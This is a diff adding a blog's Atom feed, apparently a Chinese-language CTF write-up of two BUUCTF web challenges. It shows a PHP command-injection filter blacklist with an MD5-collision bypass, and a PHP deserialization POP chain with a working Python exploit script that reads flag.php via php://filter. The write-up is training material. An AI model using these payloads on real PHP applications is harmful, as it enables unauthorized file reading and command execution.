@@ -1,0 +1,257 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;buuctf， 反序列化&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-05-05T13:34:53.000Z</updated>
+    <category term="python" />
+    <category term="buuctf" />
+    <category term="system:file" />
+    <category term="文件内无字符rce" />
+    <category term="xxe漏洞" />
+    <category term="sql文件读取" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="文件上传" />
+    <category term="xml文件上传" />
+    <category term="php反序列化" />
+    <category term="regexp注入" />
+    <category term="buuctf， 反序列化" />
+    <category term="phar反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="php7 segment fault特性" />
+    <category term="zip加密" />
+    <entry>
+        <id>http://odiws.github.io/2024/05/05/5%E6%9C%885%E6%97%A5buu/</id>
+        <title>buuctf5月5日</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/05/05/5%E6%9C%885%E6%97%A5buu/"/>
+        <content type="html">&lt;h2 id=&#34;安洵杯-2019easy_web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019easy_web&#34;&gt;#&lt;/a&gt; [安洵杯 2019] easy_web&lt;/h2&gt;
+&lt;p&gt;进行两次 base64 解密，和 hex 转字符串，得到类似图片名 555.png。&lt;/p&gt;
+&lt;?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header(&#39;content-type:text/html;charset=utf-8&#39;);
+$cmd = $_GET[&#39;cmd&#39;];
+if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
+    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
+$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
+
+$file = preg_replace(&#34;/[^a-zA-Z0-9.]+/&#34;, &#34;&#34;, $file);
+if (preg_match(&#34;/flag/i&#34;, $file)) {
+    echo &#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;;
+    die(&#34;xixi～ no flag&#34;);
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo &#34;&lt;img data-src=&#39;data:image/gif;base64,&#34; . $txt . &#34;&#39;&gt;&lt;/img&gt;&#34;;
+    echo &#34;&lt;br&gt;&#34;;
+}
+echo $cmd;
+echo &#34;&lt;br&gt;&#34;;
+if (preg_match(&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;, $cmd)) {
+    echo(&#34;forbid ~&#34;);
+    echo &#34;&lt;br&gt;&#34;;
+} else {
+    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
+        echo `$cmd`;
+    } else {
+        echo (&#34;md5 is funny ~&#34;);
+    }
+}
+
+?&gt;
+&lt;html&gt;
+&lt;style&gt;
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+&lt;/style&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;p&gt;img=555.png, 可以怀疑是文件包含，直接相同方式将 index.php 转成 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&lt;/p&gt;
+&lt;p&gt;将其重新换成代码成上述那样&lt;/p&gt;
+&lt;p&gt;5 根据源代码，该页面会通过 GET 方式获取一个 cmd 参数，&lt;/p&gt;
+&lt;p&gt;然后是一个正则匹配的黑名单，如果传入的 cmd 的值被匹配到的话就会输出 forbid。&lt;/p&gt;
+&lt;p&gt;绕过过滤后，还得通过 POST 传入两个 md5 值相等但本身不等的字符串才能执行命令。&lt;/p&gt;
+&lt;p&gt;MD5 值相等的字符串我之前收集了一组，直接拿来用。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+
+%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;通过 \ 来绕过正则，并通过 POST 传入 a 和 b，得到 flag。 使用 hackbar 会进行转码，传入会失败&lt;/p&gt;
+&lt;h2 id=&#34;反序列化的魔术方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反序列化的魔术方法&#34;&gt;#&lt;/a&gt; 反序列化的魔术方法：&lt;/h2&gt;
+&lt;p&gt;1.__destruct (类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)&lt;br&gt;
+ 2.__construct (类一执行就开始调用，其作用是拿来初始化一些值。)&lt;br&gt;
+3._&lt;em&gt;toString (在对象当做字符串的时候会被调用。)&lt;br&gt;
+4&lt;/em&gt;.&lt;em&gt;wakeup (该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)&lt;br&gt;
+5&lt;/em&gt;.&lt;em&gt;sleep (在对象被序列化的过程中自动调用。sleep 要加数组)&lt;br&gt;
+6&lt;/em&gt;.&lt;em&gt;invoke (当尝试以调用函数的方式调用一个对象时，方法会被自动调用)&lt;br&gt;
+7&lt;/em&gt;._get (当访问类中的私有属性或者是不存在的属性，触发__get 魔术方法)&lt;br&gt;
+ 8.__set (在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)&lt;br&gt;
+9.&lt;em&gt;call (当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)&lt;br&gt;
+10&lt;/em&gt;._isset (方法用于检测私有属性值是否被设定。当外部使用 isset 读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)&lt;br&gt;
+ 11.__unset (方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset 魔术方法)&lt;/p&gt;
+&lt;h2 id=&#34;mrctf2020-ezpop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020-ezpop&#34;&gt;#&lt;/a&gt; 「MRCTF2020」- Ezpop&lt;/h2&gt;
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this-&gt;append($this-&gt;var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file=&#39;index.php&#39;){
+        $this-&gt;source = $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&#34;&lt;br&gt;&#34;;
+    }
+    public function __toString(){
+        return $this-&gt;str-&gt;source;
+    }
+
+    public function __wakeup(){
+        if(preg_match(&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;, $this-&gt;source)) {
+            echo &#34;hacker&#34;;
+            $this-&gt;source = &#34;index.php&#34;;
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this-&gt;p = array();
+    }
+
+    public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }
+}
+
+if(isset($_GET[&#39;pop&#39;])){
+    @unserialize($_GET[&#39;pop&#39;]);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+}
+
+pop链：
+
+首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php
+
+首先分析一共有三个类
+
+​      Modifier
+​      Show
+​      Test
+
+看到Modifier这个类
+
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function invoke方法，__invoke方法调用了append函数，而__invoke方法怎么触发呢？(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)好，那么我们继续往下看
+看到Show这个类
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file=&#39;index.php&#39;){
+        $this-&gt;source = $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&#34;&lt;br&gt;&#34;;
+    }
+    public function __toString(){
+        return $this-&gt;str-&gt;source;
+    }
+
+    public function __wakeup(){
+        if(preg_match(&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;, $this-&gt;source)) {
+            echo &#34;hacker&#34;;
+            $this-&gt;source = &#34;index.php&#34;;
+        }
+    }
+}
+
+首先看到__construct方法，这里暂时没什么用，然后我们看到__toString方法，这里是一个输出点，暂时放着，没有什么思路
+看到Test这个类
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this-&gt;p = array();
+    }
+
+    public function __get($key){
+        $function = $this-&gt;p;
+        return $function();
+    }
+}
+
+这里有个__get()方法，我们知道(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)，而哪里使用了私有属性呢，很明显是Modifier这个类，__get方法它返回的是函数，而__invoke方法(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)
+
+所以我们的思路是：
+首先使$var=php://filter/read=convert.base64-encode/resource=flag.php
+包含一个flag.php
+然后使用Test类里的__get方法调用Modifier类中的__invoke方法，怎么调用呢？使$p这个变量为Modifier这个对象就可以调用__invoke方法，最后使用Show这个类里的__toString方法输出被包含的flag。
+使用Test类里的__get方法调用Modifier类中的__invoke方法很简单
+只需要new一个Test和new一个Modifier
+然后使Test-&gt;p = new Modifier();
+如果使Show-&gt;str=new Test();
+然后Test这个类调用了一个不存在的变量(source)触发__get()方法。
+但是这个__toString方法的调用着实卡了我好久
+该怎么调用__toString方法呢？
+这里我们看到源代码的一段
+
+  public function __wakeup()
+    {
+        if (preg_match(&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;, $this-&gt;source)) {
+            echo &#34;hacker&#34;;
+            $this-&gt;source = &#34;index.php&#34;;
+        }
+    }
+
+这里preg_match对类中的source进行比较，将它作为字符串，所以就调用了__toString方法
+__toString是在对象被当成字符串的时候调用
+所以这里我们需要使Show-&gt;source = new Show();
+即可调用__toString方法
+构造pop链：
+
+Modifier-&gt;__invoke()-&gt;append()-&gt;flag
+Test-&gt;__get()-&gt;Modifier
+Show-&gt;__wakeup()-&gt;__toString()-&gt;Test
+
+所以完整的pop链:
+
+Show-&gt;__wakeup()(preg_match把对象当作字符串触发)-&gt;__toString()(使类中的source为Test对象，输出不存在的对象触发)-&gt;Test-&gt;__get()方法-&gt;Modifier-&gt;__invoke()(调用对象以函数的形式触发)-&gt;append()-&gt;include(文件包含，包含flag)
+
+
+
+一键getflag.py
+
+import requests
+import base64
+url = &#34;http://dd9a4b21-3907-4515-b26b-998e448cc729.node3.buuoj.cn/?pop=&#34;
+payload = &#39;O:4:&#34;Show&#34;:2:{s:6:&#34;source&#34;;O:4:&#34;Show&#34;:2:{s:6:&#34;source&#34;;s:9:&#34;index.php&#34;;s:3:&#34;str&#34;;O:4:&#34;Test&#34;:1:{s:1:&#34;p&#34;;O:8:&#34;Modifier&#34;:1:{s:6:&#34;\00*\00var&#34;;s:57:&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;;}}}s:3:&#34;str&#34;;N;}&#39;
+res = requests.get(url+payload)
+print(base64.b64decode(res.text))</content>
+        <category term="buuctf， 反序列化" />
+        <updated>2024-05-05T13:34:53.000Z</updated>
+    </entry>
+</feed>
